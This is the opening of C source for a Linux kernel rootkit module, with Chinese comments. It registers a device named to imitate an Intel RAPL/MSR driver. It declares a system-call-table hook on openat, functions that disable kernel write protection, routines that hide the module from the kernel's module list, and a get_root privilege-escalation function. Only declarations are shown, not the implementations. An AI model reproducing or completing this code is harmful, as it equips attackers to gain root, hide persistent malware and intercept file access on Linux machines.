#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/kprobes.h>

#define DEVICE_NAME "inter_rapl_msrdv"
#define CLASS_NAME "inter_rapl_msrmd"
#define DEVICE_PATH "/dev/inter_rapl_msrdv"

static int major_num;
static struct class *module_class = NULL;
static struct device *module_device = NULL;
static struct file *__file = NULL;
struct inode *__inode = NULL;

static int rootkit_open(struct inode *, struct file *);
static int rootkit_release(struct inode *, struct file *);
static ssize_t rootkit_read(struct file *, char __user *, size_t, loff_t *);
static ssize_t rootkit_write(struct file *, const char __user *, size_t, loff_t *);
static long rootkit_ioctl(struct file *, unsigned int, unsigned long);

//声明我们自己写的sys_openat函数
static long my_sys_openat(const struct pt_regs *regs);

//声明系统调用表地址
static void **real_sys_call_table = 0;

typedef long (*syscall_fun)(const struct pt_regs *regs);

static syscall_fun real_sys_openat;

void enable_wp(void);

void disable_wp(void);
static struct file_operations rootkit_fo = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = rootkit_ioctl,
    .read = rootkit_read,
    .open = rootkit_open,
    .release = rootkit_release,
    .write = rootkit_write};

static struct list_head *prev;

// 模块隐藏
static void hide_myself(void);

// 模块隐藏恢复声明
static void show_myself(void);

// 提升root权限函数声明
static void get_root(void);

// 模块加载、卸载函数声明
static int __init rootkit_init(void);
static void __exit rootkit_exit(void);
